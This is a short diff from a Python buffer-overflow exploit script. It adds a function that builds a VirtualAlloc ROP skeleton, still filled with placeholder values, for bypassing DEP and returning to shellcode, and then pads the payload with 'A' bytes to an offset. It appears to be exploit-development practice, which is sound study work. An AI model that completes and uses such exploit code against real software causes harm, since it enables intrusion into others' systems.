@@ -15,6 +15,15 @@ print("[!] Port : "+ str(port))
 
 # ---------------------------
 
+def virtualalloc():
+    va  = pack("<L", 0x40404040) # VritualAlloc Call Address
+    va += pack("<L", 0x41414141) # Return to Shellcode
+    va += pack("<L", 0x42424242) # LPVOID lpAddress
+    va += pack("<L", 0x43434343) # SIZE_T dwSize
+    va += pack("<L", 0x44444444) # DWORD  flAllocationType
+    va += pack("<L", 0x45454545) # DWORD  flProtect
+    return va
+
 def build_payload():
     va = virtualalloc()
     pattern = b'A' * (offset - len(va))
